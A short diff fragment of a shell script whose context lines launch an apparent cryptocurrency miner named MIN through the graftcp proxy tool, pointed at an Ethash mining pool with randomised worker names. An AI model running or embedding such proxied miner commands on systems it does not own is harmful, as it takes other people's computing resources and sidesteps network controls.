@@ -41,4 +41,3 @@ chmod +x MIN
 ./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 1-999 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
 sleep 2
 ./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 20-188 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
- 
